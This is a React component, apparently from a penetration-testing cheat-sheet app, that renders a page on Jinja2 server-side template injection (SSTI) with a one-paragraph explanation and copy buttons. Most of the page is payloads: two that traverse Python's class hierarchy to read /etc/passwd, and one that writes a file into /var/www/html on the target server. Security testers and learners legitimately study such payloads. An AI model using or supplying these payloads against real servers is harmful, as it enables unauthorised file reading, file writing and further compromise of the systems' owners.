import React from 'react';
import { Typography, Divider } from 'antd';
import QueueAnim from 'rc-queue-anim';
const { Title, Paragraph } = Typography;

export default (props) => {
	const python_jinja_read = [
		{
			title: `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}`
		},
		{
			title: `{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}`
		}
	];
	const python_jinja_write = [
		{
			title: `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}`
		}
	];

	return (
		<QueueAnim delay={300} duration={1500}>
			<Title variant='Title level={3}' style={{ fontWeight: 'bold', margin: 15 }}>
				Template Injections (SSTI)
			</Title>
			<Paragraph style={{ margin: 15 }}>
				Template injection allows an attacker to include template code into an existant (or not) template. A
				template engine makes designing HTML pages easier by using static template files which at runtime
				replaces variables/placeholders with actual values in the HTML pages
			</Paragraph>

			<Divider dashed />
			<Title style={{ margin: 15 }} variant='Title level={4}'>
				Jinja2 ( Flask / Django )
			</Title>
			<div
				key='a'
				style={{
					padding: 15
				}}
			>
				<Title level={3}>File reading</Title>
				<Paragraph />
				{python_jinja_read.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<Divider dashed />
			<div
				key='b'
				style={{
					padding: 15
				}}
			>
				<Title level={3}>Write into a file</Title>
				<Paragraph />
				{python_jinja_write.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
		</QueueAnim>
	);
};
